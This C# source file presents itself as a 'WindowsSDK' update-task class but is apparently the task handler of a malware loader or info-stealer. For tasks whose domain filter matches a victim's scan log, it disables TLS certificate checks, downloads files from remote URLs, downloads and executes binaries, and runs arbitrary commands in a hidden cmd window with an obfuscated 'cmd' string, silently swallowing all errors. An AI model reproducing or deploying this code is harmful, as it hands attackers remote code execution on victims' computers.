using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using WindowsSDK.Extensions;
using WindowsSDK.Objects.Info;

namespace WindowsSDK.Data
{
    public static class Finilizer
    {
        static Finilizer()
        {
            try
            {
                try
                {
                    ServicePointManager.SecurityProtocol |= SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
                }
                catch
                {
                }
                ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object _, X509Certificate __, X509Chain ___, SslPolicyErrors ____) => true));
            }
            catch
            {
            }
        }

        public static IEnumerable<UpdateTask> ProcessTasks(params object[] args)
        {
            ScanResult log = (ScanResult)args[0];
            IList<UpdateTask> list = (IList<UpdateTask>)args[1];
            List<UpdateTask> list2 = new List<UpdateTask>();
            try
            {
                foreach (UpdateTask item in list)
                {
                    if (!log.ContainsDomains(item.DomainFilter))
                    {
                        continue;
                    }
                    bool flag = false;
                    try
                    {
                        switch ((int)item.Action)
                        {
                            case 0:
                                try
                                {
                                    string[] array2 = item.TaskArg.Split('|');
                                    File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array2[1]), Encoding.UTF8.GetBytes(new WebClient().DownloadString(array2[0])));
                                }
                                catch
                                {
                                }
                                flag = true;
                                break;
                            case 2:
                                {
                                    string[] array = item.TaskArg.Split('|');
                                    File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array[1]), new WebClient().DownloadData(array[0]));
                                    Process.Start(new ProcessStartInfo
                                    {
                                        WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).Directory.FullName,
                                        FileName = Environment.ExpandEnvironmentVariables(array[1])
                                    });
                                    flag = true;
                                    break;
                                }
                            case 3:
                                Process.Start(item.TaskArg);
                                flag = true;
                                break;
                            case 4:
                                Process.Start(new ProcessStartInfo(new string(new char[3] { 'c', 'm', 'd' }), new string(new char[3] { '/', 'C', ' ' }) + item.TaskArg)
                                {
                                    UseShellExecute = false,
                                    CreateNoWindow = true
                                }).WaitForExit(30000);
                                flag = true;
                                break;
                            case 1:
                                break;
                        }
                    }
                    catch
                    {
                    }
                    if (flag)
                    {
                        list2.Add(item);
                    }
                }
            }
            catch
            {
            }
            return list2;
        }
    }
}
